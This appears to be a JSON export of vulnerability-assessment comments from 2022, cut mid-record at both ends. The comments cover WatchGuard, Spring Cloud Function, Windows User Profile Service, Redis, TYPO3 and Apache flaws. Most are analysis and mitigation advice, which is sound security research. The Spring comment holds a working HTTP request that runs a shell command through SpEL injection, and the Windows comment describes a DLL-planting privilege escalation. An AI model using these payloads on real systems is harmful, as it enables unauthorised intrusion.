      "document": "The prerequisites are important:\r\n\r\n1. need `encryptionKey` from `typo3conf/LocalConfiguration.php` exposed\r\n2. need to have and identify a valid deserialization gadget chain (eg. with phpggc)\r\n3. need to identify the target PHP version (5.6, 7.2, 7.4, 8.1, etc ?) to be able to serialize the gadget chain and it to be executed correctly; is not leaked it may required to try all major versions manually\r\n\r\nso weaponizing is difficult and requires luck and lot of technical informations",
      "score": 1,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "83762c8f-263d-4f0e-85a5-72b70d955e12",
      "editorId": "d8c8480d-891a-4357-a086-25351dae6598",
      "topicId": "d265a6af-eda4-4520-b172-48fafc47ed10",
      "created": "2022-03-25T16:05:19.201958Z",
      "revisionDate": "2024-03-05T03:06:51.068744Z",
      "document": "***Edit on March 28, 2022***: On March 27, 2022 a proof of concept was posted to [GitHub](https://github.com/Throns1956/watchguard_cve-2022-26318). I'm leaving the original analysis below and will add a [reply comment](https://attackerkb.com/comments/edcb567d-7f2d-4c5e-a93c-9590b7d5b9e0) with some additional information.\r\n# Introduction \r\n\r\nOn March 17, 2022, GreyNoise published ***[WatchGuard CVE-2022-26318 RCE Detection, IOCs, and Prevention for Defenders](https://www.greynoise.io/blog/watchguard-cve-2022-26318-rce-detection-iocs-and-prevention-for-defenders)***. The writeup details GreyNoise\u2019s observation of in-the-wild exploitation of [CVE-2022-26318](https://nvd.nist.gov/vuln/detail/CVE-2022-26318). This is particularly interesting for a few reasons:\r\n\r\n1. The affected [WatchGuard](https://www.watchguard.com/) products, [FireBox and XTM](https://software.watchguard.com/), are firewall/VPN solutions. Making them obvious and delicious targets for attackers.\r\n1. There are a couple hundred thousand of these on [Shodan](https://www.shodan.io/search?query=ssl%3A%22WatchGuard%22).\r\n1. ***There is no public exploit for CVE-2022-26318***. GreyNoise\u2019s limited description is, by far, the most detailed publicly available description of what an exploit for this vulnerability might look like.\r\n1. CVE-2022-26318 *appears* to be related to [Cyclops Blinked](https://www.cisa.gov/uscert/ncas/alerts/aa22-054a), [Sandworm](https://attack.mitre.org/groups/G0034/)\u2019s [VPNFilter](https://en.wikipedia.org/wiki/VPNFilter) 2.0 which was recently unmasked by CISA, NSA, NCSC UK, and the FBI. Neither WatchGuard nor the various government agencies explicitly say the vulnerability is related, but it was the only unauthenticated, remote code execution issue patched at the same time as the Cyclops Blinked publication so it seems like a reasonable assumption.\r\n\r\nThe lack of proof of concept, or really any useful information about the vulnerability, is unfortunate. The CVE description provides no information about the attack vector or even what the vulnerability class might be. [NVD](https://nvd.nist.gov/vuln/detail/CVE-2022-26318) currently has the CWE assigned as \u201cNVD-CWE-noinfo\u201d or \u201cInsufficient Information\u201d:\r\n\r\n![nvd](https://raw.githubusercontent.com/jbaines-r7/attackerkb_images/main/CVE-2022-26318/nvd.png)\r\n\r\nPatching is not always an option. Being able to mitigate an attack using a firewall is sometimes the only solution. Being able to use network signatures to block exploitation attempts, while not ideal, is sometimes all a defender has. So when NSCS UK only publishes YARA rules (which is useless on a system that blocks access to the filesystem), CISA publishes no mitigation guidance, and WatchGuard only publishes a [log parser](https://detection.watchguard.com/), defenders are left in a tough spot when attempting to understand their exposure and mitigation options.\r\n\r\nThankfully GreyNoise shared ***some*** information. But there are still questions. Is port 4117 the only affected port? Or is the default administrative webui affected as well (hint: I think it is)? Is `/agent/login` the only vulnerable URI (hint: it isn\u2019t). But there is no official information either way, so who knows.\r\n\r\nI figured I could get the answers myself. I could quickly diff the changes between XTMv 12.1.3u7 and 12.1.3u8 and bingo bango you got an exploit. Dear reader. I\u2019ve failed you. I looked at the diffs and I haven\u2019t the faintest idea what this vulnerability is. So what is this write up? Well, just because I failed doesn\u2019t mean you will. I\u2019m going to lay out what I saw and maybe you will have better luck than me.\r\n\r\n# Getting Started\r\n\r\nTo start, we need binaries to diff. I snagged the XTMv VMWare Operating System Files [here](https://software.watchguard.com/SoftwareDownloads?current=true&familyId=a2RF00000009OmLMAU). The most current version, at the time of writing, is 12.1.3 Update 8, which is the first patched version. You can download the last unpatched version, 12.1.3 Update 7, by slightly tweaking the URL for 12.1.3 Update 8.\r\n\r\nOnce you have the XTMv `ova` file, go ahead and import it and install it. You don\u2019t need any type of license or key to get a base installation going. From there, snag the underlying .vmdk file and extract the file system using 7zip (e.g. `7z x ./xtmv_12_1_3_U8-disk1.vmdk`). You should then get a handful of mountable `.img` files that contain the XTMv system.\r\n\r\n# What Now?\r\n\r\nHaving the entire filesystem is nice. But where do we start? GreyNoise\u2019s writeup says they were seeing the vulnerability being exploited over the HTTP endpoint /agent/login on port 4117. Well, hunting in the filesystem we can find the nginx configuration for the port 4117 server:\r\n\r\n```\r\nalbinolobster@ubuntu:/media/albinolobster/5d0ede31-24e7-49b6-b114-abed98c4830f$ cat ./etc/nginx/http-server-wgagent\r\nserver {\r\n    listen              4117 ssl;\r\n    listen              [::]:4117 ssl;\r\n\r\n    include             fastcgi_params;\r\n    fastcgi_param       SCRIPT_NAME     $fastcgi_script_name;\r\n    fastcgi_param       SCRIPT_FILENAME $document_root$fastcgi_script_name;\r\n    fastcgi_param       WG_SSL_SERVER_CERT /var/run/nginx/server.pem;\r\n    fastcgi_request_buffering off;\r\n\r\n    if ($request_method !~ ^(GET|HEAD|POST)$) { return 444; }\r\n\r\n    location /agent/ {\r\n        fastcgi_pass    unix:/usr/share/web/upload/tmp/wgagent;\r\n        # /agent/file_action can take a while, e.g. backup\r\n        fastcgi_read_timeout    10m;\r\n    }\r\n    location /login {   # no trailing slash\r\n        fastcgi_pass    unix:/usr/share/web/upload/tmp/wgagent;\r\n    }\r\n    location /logout {\r\n        fastcgi_pass    unix:/usr/share/web/upload/tmp/wgagent;\r\n    }\r\n    location /ping {    # no trailing slash\r\n        fastcgi_pass    unix:/usr/share/web/upload/tmp/wgagent;\r\n    }\r\n    location /cluster/ {\r\n        fastcgi_pass    unix:/usr/share/web/upload/tmp/wgagent;\r\n    }\r\n}\r\n```\r\n\r\nThis points to the `wgagent` binary being the binary of interest. It can be found in `/usr/bin/`. \r\n\r\n# What Should the Exploit Look Like?\r\n\r\nBased on my understanding of GreyNoise\u2019s writeup and the logic contained in `wgagent` the exploit occurs during authentication. Therefore the exploit is likely to look like a variation on a valid login request like the following: \r\n\r\n```py\r\nimport requests\r\nimport zlib\r\nimport binascii\r\nfrom urllib3.exceptions import InsecureRequestWarning\r\n\r\n# Suppress only the single warning from urllib3 needed.\r\nrequests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)\r\n\r\n\r\nurl = 'https://10.0.0.11:4117/agent/login'\r\nlogin_data = b'<methodCall><methodName>login</methodName><params><param><value><struct><member><name>password</name><value><string>readwrite</string></value></member><member><name>user</name><value><string>admin</string></value></member><member><name>domain</name><value><string>Firebox-DB</string></value></member><member><name>uitype</name><value><string>2</string></value></member></struct></value></param></params></methodCall>'\r\n\r\nextra_headers = { 'Content-Encoding': 'gzip' }\r\ncomp = zlib.compressobj(zlib.Z_DEFAULT_COMPRESSION, zlib.DEFLATED, -15)\r\ncompressed_login_data = b'\\x1f\\x8b\\x08\\x07\\x41\\x41\\x41\\x41\\x41\\x41' \r\ncompressed_login_data += comp.compress(login_data)\r\ncompressed_login_data += comp.flush()\r\n\r\nprint('Uncompressed data length: %u' % len(login_data))\r\nprint('Compressed data length: %u' % len(compressed_login_data))\r\n\r\nx = requests.post(url, data = compressed_login_data, headers = extra_headers, verify=False)\r\n\r\nprint(x.status_code)\r\nprint(x.text)\r\n```\r\n\r\nThere are a couple of interesting tidbits about this though:\r\n\r\n1. Compression isn\u2019t required for a login request. `wgagent` only tries to remove the compression if `Content-Encoding: gzip` is included (shocking, I know). But GreyNoise noted that the exploits they saw in the wild uses compression\u2026 So maybe that\u2019s required for exploitation? Maybe not, who knows!\r\n2. This request also works on the default administrative webui port (8080). Which implies, to me, that 4117 is not the only vulnerable endpoint. Considering that the default webui is far more likely to be exposed to the internet, it\u2019s a pretty important thing to keep in mind. E.g. You aren\u2019t safe just because you blocked port 4117. Maybe you need to block 8080 as well. Who knows though! (Probably CISA and WatchGuard).\r\n\r\nRegardless, the above code hits, at least, part of the desired code path. So now we need to hunt for the vulnerable code. Hopefully aided by binary diffing!\r\n\r\n# Ch-Ch-Ch-Ch-Changes\r\n\r\nThere are a large number of differences between 12.1.3u7 and 12.1.3u8. Unfortunately (or fortunately), WatchGuard fixed five other CVEs and a number of other issues with the [update 8](https://www.watchguard.com/support/release-notes/fireware/12/en-US/EN_ReleaseNotes_Fireware_12_1_3_U8/index.html#Fireware/en-US/resolved_issues.html?TocPath=_____5) release. Looking at the changes, I had a very hard time determining if some of them were because \u201cWell, we\u2019re in here so might as well tweak this\u201d or actually related to a vulnerability.\r\n\r\nUnfortunately, I don\u2019t currently have access to [diaphora](https://github.com/joxeankoret/diaphora). This task probably would have been easier with it, but `radiff2` + Ghidra is tolerable. The problem is, I couldn\u2019t pinpoint any one thing that looked obviously exploitable\u2026 or even \u201cmaybe this is exploitable\u201d. The changes seemed to fit into two categories:\r\n\r\nPerplexing. Why was this here in the first place? Why did WatchGuard remove it now? A great example, mentioned below, is the !ENTITY logic.\r\nUnnecessary. Why did zlib get updated? Why was password hashing standardized?\r\n\r\nThe \u201cscary\u201d part is both categories just show my ignorance and, worse, lack of imagination. About 90% of my vulnerability analysis skill is a weird mix of intuition+experience. And, for whatever reason, this diff has me feeling like Gandalf in Moria.\r\n\r\nSo, I can\u2019t provide useful context to any of this, but I can point out a couple of changes that occurred along the likely exploitation path. Maybe that will spark something in someone else\u2019s brain.\r\n\r\n## Removal of !ENTITY logic\r\nIn the following screenshot you\u2019ll see the unpatched version of `wgagent` previously search for the string \u201c!ENTITY\u201d in the HTTP POST payload. If found, it walks backwards through the HTTP payload updating the contents to use the local locale for\u2026 reasons. Note that this is done before decompression. Odd. But not obviously exploitable (to me).\r\n\r\n![entity](https://raw.githubusercontent.com/jbaines-r7/attackerkb_images/main/CVE-2022-26318/entity.png)\r\n\r\n## Update of zlib\r\n\r\nWatchGuard XTMv was using a fairly old version of [zlib](https://www.zlib.net/) to inflate the compressed HTTP payload. The zlib version being used in the unpatched version, 1.2.8, just so happens to be the same version analyzed by Trail of Bits and TrustInSoft for [Mozilla](https://wiki.mozilla.org/images/0/09/Zlib-report.pdf) back in 2016. The findings were *very* theoretical as far as actual exploitation goes, and, to my knowledge, zlib hasn\u2019t had any CVE since that report.\r\n\r\nBut WatchGuard upgraded to zlib 1.2.11 with this update. Did they need to do that in order to fix this vulnerability? I doubt it. But worth noting.\r\n\r\n![zlib](https://raw.githubusercontent.com/jbaines-r7/attackerkb_images/main/CVE-2022-26318/zlib.png)\r\n\r\n## Add \u201cstruct\u201d to the state machine\r\n\r\n`wgagent` uses libxml2 to parse the XML payload. But it does so, in part, by using the [push parser](https://gitlab.gnome.org/GNOME/libxml2/-/wikis/Parser-interfaces#Invoking1) which allows them to do some custom and stateful parsing. I very much assume the vulnerability lies in one of these functions. But the only major change was the addition of extraction and cleanup of the \u201c<struct></struct>\u201d tags (cleanup not pictured, and see the payload above to see how <struct> is used).\r\n\r\n![struct](https://raw.githubusercontent.com/jbaines-r7/attackerkb_images/main/CVE-2022-26318/struct.png)\r\n\r\nI cannot actually link this logic to anything useful. The only notable thing is that the XML payload now *must* have the struct tags, whereas before it was optional. Meaning, in 12.1.3u7 a request without the struct tags is accepted, but in 12.1.3u8 the request is rejected. But, again, I can\u2019t link the added logic to any vulnerability or faulty logic\u2026 but this addition does suggest something?. Probably.\r\n\r\n## Update to standardize password hashing\r\n\r\nAfter the XML parsing, the contents are obviously used for *something*. In this case, authentication. One change in the authentication world was the change highlighted below. `FUN_004153e2` previously converted the provided user\u2019s password into a UTF-16 representation and then MD4 hashed it. This function was deprecated in favor of a new and slightly different version of this functionality in `libwgcrypto.so`. \r\n\r\n![hash](https://raw.githubusercontent.com/jbaines-r7/attackerkb_images/main/CVE-2022-26318/hash.png)\r\n\r\nOnce again, I don\u2019t see anything obviously wrong in `FUN_004153e2`. Certainly, it makes sense to use a standard implementation in a single library but why make the change in this update? \r\n\r\nThere are a slew of other changes, but mostly they are related to the memory corruption issues in the upgrade process (I believe). And of course, I was only looking at `wgagent` and associated libraries. The reality is that the vulnerability could exist elsewhere. But if you are going down this journey yourself, maybe it will help.\r\n\r\n# Final Thoughts\r\n\r\nOne thing that should be pointed out about the Cyclops Blink malware, is that the NCSC UK write up only seems to address a PowerPC variant. However, the virtualized version that I tested (XTMv) is x86 based. Does that mean NCSC UK thinks only PowerPC versions of WatchGuard appliances are affected? Or maybe Sandworm only cared about PowerPC? Or NCSC UK only saw PowerPC versions in the wild? It\u2019s these types of questions that a well thought out report would have addressed.\r\n\r\nFinally, as I mentioned in a Twitter [thread](https://twitter.com/_darrenmartyn) with [@wvuuuuuuuuuuuuu](https://twitter.com/wvuuuuuuuuuuuuu) and [@_darrenmartyn](https://twitter.com/_darrenmartyn), the GreyNoise observed exploit is sort of mystifying. Why would an attacker that had achieved RCE on a system exfiltrate an entire configuration file? Especially, when the exfiltrated file isn\u2019t the one with usernames and password hashes? Exfiltration via TFTP is just an odd choice. And I\u2019m not sure what to make of the exploit name (`test.py`). All of that would suggest an unsophisticated attacker to me\u2026 but then they\u2019re using a vulnerability I can\u2019t figure out. So who\u2019s the unsophisticated one?\r\n",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "14fe6ba7-d9bb-4d5a-8e74-344a9f7a4296",
      "editorId": "def09af1-8f99-4d16-aaa9-1db131246a3a",
      "topicId": "3c5cf154-6882-4093-86f8-445bf9dcef8a",
      "created": "2022-03-25T20:04:53.186918Z",
      "revisionDate": "2022-04-27T20:52:34.3636Z",
      "document": "Muhstik Gang has been seen exploiting this vulnerability to target Redis servers\r\nPoc is publicly available  https://github.com/aodsec/CVE-2022-0543",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": []
    },
    {
      "id": "758fc12d-e515-4be2-bd33-13190c2800b8",
      "editorId": "21bbecb3-b64e-4962-bcfd-0cff731815f5",
      "topicId": "07ee76f3-5083-40c4-ab3f-d4e29c8c2550",
      "created": "2022-03-28T07:35:40.75826Z",
      "revisionDate": "2022-03-28T07:35:40.757302Z",
      "document": "",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Discovery",
        "attacker-value": 5,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        }
      ]
    },
    {
      "id": "5a4fcf05-a0d7-455d-a8c0-57931221042c",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "2a1bfbbe-fd48-497e-8f3e-bb65670a94fa",
      "created": "2022-03-29T12:10:28.476833Z",
      "revisionDate": "2022-03-29T12:10:28.475486Z",
      "document": "This bug was evidently [used by LAPSUS$](https://twitter.com/billdemirkapi/status/1508527492285575172) in the wild as part of the attack on Okta.",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "e4b3218d-a2ca-4b7f-a7a0-1415182bb15c",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "2a1bfbbe-fd48-497e-8f3e-bb65670a94fa",
      "created": "2022-03-30T16:21:04.611384Z",
      "revisionDate": "2022-03-30T16:21:04.608721Z",
      "document": "Appears there may have been some confusion here. As noted at https://twitter.com/wdormann/status/1508555477491269638 and at https://twitter.com/BillDemirkapi/status/1508527487655067660/photo/1, the attackers tried to download `UserProfileSvcEoP.exe` from https://github.com/klinix5/ProfSvcLPE/blob/main/DoubleJunctionEoP/Release/UserProfileSvcEoP.exe. If you look at https://github.com/klinix5/ProfSvcLPE/blob/main/write-up.docx you can see this is actually a patch bypass for CVE-2021-34484, and was later fixed by [CVE-2022-21919](https://attackerkb.com/topics/2sQXBnLJYq/cve-2022-21919).\r\n\r\nIronically enough this later got another patch bypass in the form of [CVE-2022-26904](https://attackerkb.com/topics/RHSMbN1NQY/cve-2022-26904) which at the time of writing is still unpatched.\r\n\r\nAll of these vulnerabilities exploit a logic flaw whereby the User Profile Service had a `CreateDirectoryJunction()` function that did not appropriately validate its input to ensure it wasn't using symbolic links along any point of the path prior to creating a directory junction between two directories. This could be abused by attackers manipulating paths along the file path to gain code execution as the SYSTEM user by planting a DLL in a sensitive location which would then be loaded by a privileged process.",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "81b566f6-479a-4d92-957d-f34c6fb81b49",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "5abbd3e2-aa30-41cb-96da-34b5e76d030c",
      "created": "2022-03-30T16:52:24.227334Z",
      "revisionDate": "2022-03-30T16:52:24.224783Z",
      "document": "This is a bypass for [CVE-2022-21919](https://attackerkb.com/topics/2sQXBnLJYq/cve-2022-21919) which is in turn a bypass for [CVE-2021-34484](https://attackerkb.com/topics/qo2zIGKm9O/cve-2021-34484?referrer=search). As noted at https://twitter.com/billdemirkapi/status/1508527492285575172, CVE-2022-21919 was already being exploited in the wild by using the binary from https://github.com/klinix5/ProfSvcLPE/blob/main/DoubleJunctionEoP/Release/UserProfileSvcEoP.exe. \r\n\r\nThe vulnerability, near as I can tell, occurs due to the `CreateDirectoryJunction()` function inside `profext.dll` not appropriately validating things before creating a directory junction between two directories. This can allow an attacker to create a directory junction between a directory they have access to and another directory that they should not have access to, thereby granting them the ability to plant files in sensitive locations and or read sensitive files.\r\n\r\nThe exploit code for this, which was originally at https://github.com/klinix5/SuperProfile but which got taken down, is now available at  https://github.com/rmusser01/SuperProfile and its associated forks. I have taken this code and updated it and touched it up a bit into a Metasploit exploit module that is now available at https://github.com/rapid7/metasploit-framework/pull/16382.\r\n\r\nThis exploit code utilizes this vulnerability to plant a malicious `comctl32.dll` binary in a location that the `Narrator.exe` program will try to load the DLL from when it starts. By utilizing the `ShellExecute` command with the `runas` option, we can force a UAC prompt to come up that will run the `consent.exe` program to run. If the `PromptOnSecureDesktop` setting is set to `1` which is the default, this will result in `consent.exe` running as `SYSTEM` on the secure desktop, and a new `narrator.exe` instance will also spawn as `SYSTEM` on the secure desktop, which will then load the malicious `comctl32.dll` DLL and allow us to execute our code as `SYSTEM`.\r\n\r\nNote that if `PromptOnSecureDesktop` is set to 0 under the key `HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System`, then this LPE will not be possible as the UAC prompt will spawn as the current user vs as `SYSTEM` on the restricted desktop, and therefore we will not achieve privilege elevation, so this is a workaround for the vulnerability whilst it is not patched.\r\n\r\nIt should be noted that as this stands the current exploit requires valid credentials for another user on the system who is a non-admin user and who has permissions to log into the target computer. They must also have a profile under `C:\\Users` for the exploit to function in its current state. There has been some rumors that it might be possible to do this without a secondary login, however nothing concrete has been found so far, so we are considering this a prerequisite for exploitation for the time being.\r\n\r\nWe, aka Rapid7, have reported this vulnerability to Microsoft and have given KLINIX5, who originally found this vulnerability and wrote the original exploit code, full credit for the discovery, however Microsoft have only given us this CVE number and have not provided a timeline on when they expect a fix for this vulnerability at this time. It is therefore recommended to use the mitigation above until an appropriate fix is developed.",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "cda33728-908a-4394-9bd5-d4126557d225",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "5bdfacbd-4722-492a-aaa8-ebcc3c6403c4",
      "created": "2022-03-30T20:46:16.036436Z",
      "revisionDate": "2022-04-05T17:33:13.837267Z",
      "document": "CVE-2022-22963 is an unauthenticated remote code execution vulnerability within Spring Cloud Function prior to 3.1.7 and 3.2.3. This vulnerability should not be confused with the reported 0-day dubbed Spring4Shell that was disclosed at around the same time.\r\n\r\nThe cause of this vulnerability is an unsafe evaluation context for the [Spring Expression Language (SpEL)](https://docs.spring.io/spring-framework/docs/3.2.x/spring-framework-reference/html/expressions.html) that can be included in the `spring.cloud.function.routing-expression` header. By crafting a POST request with the header, an attacker may execute malicious SpEL queries resulting in code execution in the context of the Spring Cloud Function application.\r\n\r\nOne early PoC demonstrated that the SpEL query could be used to execute an OS command through the Java Runtime. The following example echos to the `/tmp/success` file. It differs from the original by using an array of strings for the arguments passed to `exec`. Because the header value is an SpEL query, single quotes should be [escaped by doubling them](https://docs.spring.io/spring-cloud-dataflow/docs/1.2.3.RELEASE/reference/html/shell-white-space.html#CO10-2).\r\n\r\n```\r\nPOST /functionRouter HTTP/1.1\r\nHost: 192.168.159.128:8080\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.81 Safari/537.36 Edg/97.0.1072.69\r\nspring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{'/bin/sh','-c','echo \"hello world\" >> /tmp/msf-success'})\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 0\r\n```\r\n\r\nOn successful exploitation, the server responds with a 500 error and a JSON response.\r\n\r\n```\r\nHTTP/1.1 500 Internal Server Error\r\nContent-Type: application/json\r\nContent-Length: 153\r\n\r\n{\"timestamp\":\"2022-03-30T20:41:28.551+00:00\",\"path\":\"/functionRouter\",\"status\":500,\"error\":\"Internal Server Error\",\"message\":\"\",\"requestId\":\"8fed4100-1\"}\r\n```\r\nThe response from a server that was patched for the vulnerability (versions 3.1.7 and 3.2.3) is identical.\r\n\r\nThe vulnerability was patched on March, 29th, 2022 in commit [bcb2a25a](https://github.com/spring-cloud/spring-cloud-function/commit/bcb2a25a28f3d026b35a795abe18d14f9cdb3022). The patch adds a [second evaluation context](https://github.com/spring-cloud/spring-cloud-function/blob/bcb2a25a28f3d026b35a795abe18d14f9cdb3022/spring-cloud-function-context/src/main/java/org/springframework/cloud/function/context/config/RoutingFunction.java#L64) and uses it when the SpEL query [originates](https://github.com/spring-cloud/spring-cloud-function/blob/bcb2a25a28f3d026b35a795abe18d14f9cdb3022/spring-cloud-function-context/src/main/java/org/springframework/cloud/function/context/config/RoutingFunction.java#L202) from the HTTP request header. The [SimpleEvaluationContext](https://docs.spring.io/spring-framework/docs/5.0.6.RELEASE/javadoc-api/org/springframework/expression/spel/support/SimpleEvaluationContext.html) is used when the query originates from a header.\r\n\r\n> SimpleEvaluationContext is tailored to support only a subset of the SpEL language syntax, e.g. excluding references to Java types, constructors, and bean references.",
      "score": 1,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "517a45c3-5201-4e06-8c32-6866bd3f0d95",
      "editorId": "734ed017-71cc-4439-a1b6-f332d60eca40",
      "topicId": "72226394-5463-44cd-9c07-31af065f4747",
      "created": "2022-03-31T16:16:55.149037Z",
      "revisionDate": "2022-03-31T16:16:55.149077Z",
      "document": "",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Persistence",
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "17fdfb85-8dfd-4dbf-bd2b-7cd032026885",
          "name": "Requires physical access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_exploit"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "57f89b59-db73-40c6-bd39-c34c36ce0e58",
      "editorId": "38346220-4c55-4428-af6f-466a697194f3",
      "topicId": "4bb9d3c7-37ef-4b65-b2a8-550afc30664c",
      "created": "2022-03-31T18:23:54.6323Z",
      "revisionDate": "2022-03-31T18:23:54.631443Z",
      "document": "Trivial to detect and use.",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "3dfe4f09-3388-4eb7-8523-fedcb9aeb179",
      "editorId": "38346220-4c55-4428-af6f-466a697194f3",
      "topicId": "bd8195d2-fb3b-4f9b-82c5-32f5cbdeff70",
      "created": "2022-03-31T18:44:00.569069Z",
      "revisionDate": "2022-03-31T18:44:00.568127Z",
      "document": "Qualys says:\r\n\r\n> CVE-2021-42013 was introduced as the fix for CVE-2021-41773 in Apache HTTP Server 2.4.50 was insufficient as it did not cover double URL encoding, therefore the vulnerable configurations remained the same, but payload used in 2.4.49 was double URL encoded in 2.4.50 to administer the same path traversal and remote code execution attack.\r\n>\r\n> The attack in 2.4.49 initially encoded the second dot (.) to %2e and the same was double URL encoded into %%32%65 for version 2.4.50",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "c6f37f07-8d86-48f4-a0ae-3dd6523a852f",
